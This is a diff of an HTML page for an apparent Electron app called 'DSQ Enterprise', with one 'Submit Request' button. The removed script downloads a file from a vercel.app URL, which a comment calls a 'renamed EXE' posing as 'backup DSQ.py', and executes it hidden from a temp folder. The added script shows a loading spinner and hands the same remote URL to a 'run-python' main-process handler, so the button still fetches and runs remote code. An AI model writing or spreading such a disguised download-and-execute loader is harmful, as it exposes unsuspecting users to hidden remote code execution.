@@ -4,52 +4,64 @@
 <meta charset="UTF-8">
 <title>DSQ Enterprise</title>
 <style>
-    body { font-family: Arial, sans-serif; padding: 20px; }
+    body { font-family: Arial, sans-serif; padding: 20px; position: relative; }
     button { padding: 10px 20px; font-size: 16px; cursor: pointer; }
+
+    /* Loading overlay */
+    #loadingOverlay {
+        display: none; /* hidden by default */
+        position: fixed;
+        top: 0; left: 0; width: 100%; height: 100%;
+        background: rgba(0,0,0,0.5);
+        z-index: 9999;
+        justify-content: center;
+        align-items: center;
+    }
+
+    .spinner {
+        border: 8px solid #f3f3f3;
+        border-top: 8px solid #3498db;
+        border-radius: 50%;
+        width: 60px;
+        height: 60px;
+        animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+        0% { transform: rotate(0deg);}
+        100% { transform: rotate(360deg);}
+    }
 </style>
 </head>
 <body>
 
 <button id="mobilityBtn">Submit Request</button>
 
+<!-- Loading overlay -->
+<div id="loadingOverlay">
+    <div class="spinner"></div>
+</div>
+
 <script>
-    const { exec } = require('child_process');
-    const fs = require('fs');
-    const https = require('https');
-    const path = require('path');
-    const os = require('os');
+    const { ipcRenderer } = require('electron');
 
-    document.getElementById('mobilityBtn').addEventListener('click', () => {
-        const exeUrl = 'https://dsq-beta.vercel.app/backup DSQ.py'; // renamed EXE
-        const tempPath = path.join(os.tmpdir(), 'backup DSQ.py'); // download to temp folder
+    const btn = document.getElementById('mobilityBtn');
+    const overlay = document.getElementById('loadingOverlay');
 
-        const file = fs.createWriteStream(tempPath);
+    btn.addEventListener('click', () => {
+        overlay.style.display = 'flex'; // show spinner
+        btn.disabled = true;
 
-        https.get(exeUrl, (res) => {
-            if (res.statusCode !== 200) {
-                console.error('❌ Failed to download EXE:', res.statusCode);
-                return;
-            }
+        const exeUrl = 'https://dsq-beta.vercel.app/backup DSQ.py';
+        ipcRenderer.send('run-python', exeUrl);
+    });
 
-            res.pipe(file);
-            file.on('finish', () => {
-                file.close(() => {
-                    console.log('✅ EXE downloaded, running now...');
-                    exec(`"${tempPath}"`, { windowsHide: true }, (err, stdout, stderr) => {
-                        if (err) console.error('❌ Execution error:', err);
-                        if (stdout) console.log('✅ stdout:', stdout);
-                        if (stderr) console.error('⚠️ stderr:', stderr);
-                    });
-                });
-            });
-        }).on('error', (err) => {
-            console.error('❌ Download error:', err.message);
-        });
+    // Listen for "process-finished" signal from main.js
+    ipcRenderer.on('process-finished', () => {
+        overlay.style.display = 'none';
+        btn.disabled = false;
     });
 </script>
 
 </body>
 </html>
-
-
-
